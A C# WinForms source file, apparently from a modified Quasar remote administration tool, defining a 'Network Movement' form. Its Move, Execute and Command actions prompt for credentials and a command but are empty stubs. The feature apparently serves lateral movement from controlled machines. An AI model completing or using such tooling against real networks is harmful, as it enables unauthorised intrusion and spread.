using Quasar.Common.Enums;
using Quasar.Common.Messages;
// Custom
using Quasar.Common.Models;
using Quasar.Server.Controls;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmNetworkMovement : Form
    {
        /// <summary>
        /// The client which can be used for the network movement.
        /// </summary>
        private readonly Client _connectClient;

        private readonly NetworkHandler _networkHandler;

        /// <summary>
        /// Holds the opened network movement form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmNetworkMovement> OpenedForms = new Dictionary<Client, FrmNetworkMovement>();

        /// <summary>
        /// Creates a new network movement form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the network movement form.</param>
        /// <returns>
        /// Returns a new network movement form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmNetworkMovement CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmNetworkMovement f = new FrmNetworkMovement(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmNetworkMovement(Client client)
        {
            _connectClient = client;
            _networkHandler = new NetworkHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            MessageHandler.Register(_networkHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_networkHandler);
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmNetworkMovement_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Network Movement", _connectClient);
            _networkHandler.RefreshEntities();
        }

        private void toolStripMoveItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripExecuteItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripCommandItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripRefreshItem_Click(object sender, EventArgs e)
        {
            _networkHandler.RefreshEntities();
        }

        private void FrmNetworkMovement_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }
    }
}
